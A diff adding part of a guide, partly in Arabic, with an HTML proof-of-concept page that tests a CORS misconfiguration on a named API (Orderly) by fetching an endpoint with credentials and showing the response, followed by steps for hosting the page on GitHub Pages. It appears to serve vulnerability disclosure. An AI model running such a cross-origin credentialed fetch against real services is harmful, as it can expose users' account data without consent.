@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC</title>
+    <style>
+        body{font-family:Arial;padding:20px;background:#1a1a2e;color:#eee}
+        .result{background:#16213e;padding:15px;margin:10px 0;border-radius:8px;border-left:4px solid #00ff00}
+        pre{background:#0f0f1a;padding:10px;overflow-x:auto}
+        button{background:#e94560;color:#fff;padding:15px 30px;border:none;cursor:pointer;font-size:16px;border-radius:5px}
+    </style>
+</head>
+<body>
+    <h1>Orderly CORS PoC</h1>
+    <p><b>Origin:</b> <span id="o"></span></p>
+    <button onclick="test()">Test CORS</button>
+    <div id="r"></div>
+    <script>
+    document.getElementById('o').textContent=location.origin;
+    async function test(){
+        document.getElementById('r').innerHTML='<p>Testing...</p>';
+        try{
+            let res=await fetch('https://api.orderly.org/v1/public/info',{credentials:'include'});
+            let data=await res.json();
+            document.getElementById('r').innerHTML='<div class="result"><h3>CORS Vuln Confirmed!</h3><p>Origin: '+location.origin+'</p><pre>'+JSON.stringify(data,null,2)+'</pre></div>';
+        }catch(e){
+            document.getElementById('r').innerHTML='<p style="color:red">Error: '+e.message+'</p>';
+        }
+    }
+    </script>
+</body>
+</html>
+```
+
+---
+
+## الخطوة 4: احفظ الملف
+
+انزل تحت الصفحة وراح تشوف قسم **"Commit new file"** أو **"Commit changes"**. اكتب رسالة قصيرة مثل "Add poc" واضغط الزر الأخضر **"Commit new file"**
+
+---
+
+## الخطوة 5: انتظر دقيقة
+
+GitHub Pages يحتاج دقيقة أو دقيقتين عشان يحدث الموقع.
+
+---
+
+## الخطوة 6: افتح الصفحة
+
+بعد الانتظار، افتح:
+```
+https://imperror.me/poc.html
